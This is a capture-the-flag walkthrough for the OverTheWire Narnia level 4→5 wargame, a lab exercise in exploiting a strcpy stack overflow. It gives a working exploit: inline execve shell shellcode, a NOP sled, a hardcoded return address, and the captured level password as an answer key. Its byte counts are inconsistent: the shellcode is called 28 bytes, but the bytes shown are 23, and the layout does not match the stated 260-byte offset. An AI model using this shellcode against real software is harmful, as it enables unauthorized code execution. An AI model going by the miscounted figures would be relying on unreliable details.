# Narnia Level 4 → 5

## Goal

Same shape as [level 2 → 3](level02.md): `strcpy(buf, argv[1])` with a larger buffer (256 bytes). The binary also **zeros out the environment** before it runs, so you can't rely on `EGG`/`SHELLCODE` env vars — your shellcode has to live **inside the buffer itself**.

## Concepts you'll learn

- Environment clearing (`for (; *envp; envp++) *envp = '\0';` or `clearenv()`) as a hardening attempt
- Why NOP-sled + inline shellcode still works when envs are scrubbed — the attack surface is the buffer itself
- Scaling the level-2 technique to a bigger buffer

## Walkthrough

### 1. Read the source

```c
int main(int argc, char *argv[], char **envp){
    int i;
    char buffer[256];

    for(i = 0; envp[i] != NULL; i++)
        memset(envp[i], '\0', strlen(envp[i]));

    if(argc != 2) { ... }

    strcpy(buffer, argv[1]);
    printf("%s", buffer);
    return 0;
}
```

`envp` wiping + unbounded `strcpy`. Identical primitive to level 2 but bigger `buf`.

### 2. Offset and payload

Offset from `buffer` start to saved return address: 256 + 4 (saved EBP) = **260 bytes**. (Verify with a cyclic pattern.)

Payload:

```
[ 236 NOPs ][ 28-byte shellcode ][ 4-byte return address pointing into NOPs ]
```

### 3. Find a return address

Under `gdb`, with the same args, dump `$esp` and pick something inside the NOP sled. Axcheron used `0xffffd7b4`.

```bash
$ P=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*236 + b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80" + b"\xb4\xd7\xff\xff")')
$ /narnia/narnia4 "$P"
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
faimahchiy
```

Same troubleshooting advice as level 2: widen the NOP sled or pick an address further into its middle if it segfaults.

## The answer

The password for `narnia5` is:

**`faimahchiy`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/narnia/narnia4.html>
